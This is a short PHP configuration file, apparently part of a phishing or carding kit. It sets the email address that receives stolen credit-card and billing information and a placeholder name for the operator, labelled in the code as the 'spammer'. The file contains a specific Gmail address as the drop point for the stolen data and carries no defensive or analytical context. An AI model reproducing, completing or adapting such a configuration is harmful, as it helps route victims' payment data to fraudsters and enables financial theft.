﻿ <?php


# For cc and billing info put Your Email here
$spammer_email = "rayanbirikh2011@gmail.com";


# Your Name here
$spammerName = "EXEMPLE";


?>

